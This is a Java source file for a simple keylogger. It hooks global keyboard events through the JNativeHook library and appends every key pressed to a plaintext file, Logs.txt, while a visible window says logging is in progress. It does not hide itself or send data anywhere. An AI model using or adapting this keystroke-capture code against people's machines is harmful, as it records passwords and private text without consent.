package logs;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import javax.swing.*;
import java.awt.*;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class Logger implements NativeKeyListener {




    File myFile= new File("Logs.txt");




    public static void main(String[] args) throws NativeHookException {
        JLabel label = new JLabel();
        label.setText("currently Logging...");
        label.setHorizontalTextPosition(JLabel.CENTER);
        label.setVerticalTextPosition(JLabel.CENTER);
        label.setAlignmentX(JLabel.CENTER);
        label.setAlignmentY(JLabel.CENTER);
        label.setFont(new Font("MV Boli",Font.PLAIN,45));
        JFrame frame = new JFrame();
        frame.setVisible(true);
        frame.setTitle("Logger");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setSize(420,420);
        frame.getContentPane().setBackground(new Color(123,50,250));
        frame.add(label);
        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(new Logger());

    }
    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        System.out.println("Pressed: "+NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));


        FileWriter fr = null;
        try {
            fr = new FileWriter(myFile, true);
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {

            fr.write(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode())+" ");
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            fr.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
//        try {
//            FileWriter myWriter = new FileWriter("Logs.txt");
//            myWriter.append("Pressed: "+NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode())+"\n");
//            myWriter.close();
//        } catch (IOException e) {
//            e.printStackTrace();
//        }

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
        System.out.println("Released: "+NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));

//        FileWriter fr = null;
//        try {
//            fr = new FileWriter(myFile, true);
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//        try {
//            fr.write("Released: "+NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//        try {
//            fr.close();
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//        try {
//            FileWriter myWriter = new FileWriter("Logs.txt");
//            myWriter.append("Released: "+NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode())+"\n");
//            myWriter.close();
//        } catch (IOException e) {
//            e.printStackTrace();
//        }


    }
    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }


}

